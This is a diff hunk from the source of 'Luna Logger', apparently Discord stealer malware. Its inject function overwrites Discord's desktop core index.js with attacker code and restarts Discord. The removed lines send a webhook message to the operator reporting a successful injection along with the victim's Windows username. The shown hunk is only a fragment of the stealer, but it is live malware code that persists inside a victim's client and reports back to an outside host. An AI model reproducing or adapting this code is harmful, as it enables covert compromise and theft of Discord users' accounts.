@@ -502,27 +502,6 @@ def inject(webhook_url):
                     with open(abspath+f'\\modules\\{difflib.get_close_matches("discord_desktop_core", modules_dir, n=1, cutoff=0.6)[0]}\\discord_desktop_core\\index.js', 'w', encoding="utf-8") as indexFile:
                         indexFile.write(f)
                     subprocess.call(["start", abspath+os.sep+"Discord.exe"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    
-    if os.path.exists(appdata+'\\discord'):
-        with open(abspath+f'\\modules\\{difflib.get_close_matches("discord_desktop_core", modules_dir, n=1, cutoff=0.6)[0]}\\discord_desktop_core\\index.js', 'r', encoding="utf-8") as indexFile:
-            index = indexFile.read()
-            if webhook_url in index:
-                webhook = Webhook.from_url(webhook_url, adapter=RequestsWebhookAdapter())
-                embed = Embed(title="Luna Logger", color=5639644)
-
-                embed.set_footer(text="Luna Logger | Created by Smug")
-                embed.set_thumbnail(url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096")
-                embed.add_field(name="Injection", value=f"Successfully injected into Discord\nUser: {os.getenv('UserName')}", inline=False)
-
-                content = ""
-
-                if ping == True:
-                    if pingType == "everyone":
-                        content += "@everyone"
-                    elif pingType == "here":
-                        content += "@here"
-
-                webhook.send(content=content, embed=embed, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Luna")
 
 class debug:
     def __init__(self):
